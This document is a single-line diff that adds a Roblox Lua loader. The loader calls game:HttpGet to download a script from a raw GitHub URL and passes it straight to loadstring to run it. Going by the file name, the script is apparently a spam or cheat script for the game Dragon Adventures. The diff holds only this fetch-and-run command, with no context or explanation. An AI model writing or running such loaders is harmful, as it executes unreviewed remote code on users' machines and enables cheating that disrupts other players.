@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/dragon-adventures-spam1-y7rgi8utiifp7g.lua"))()
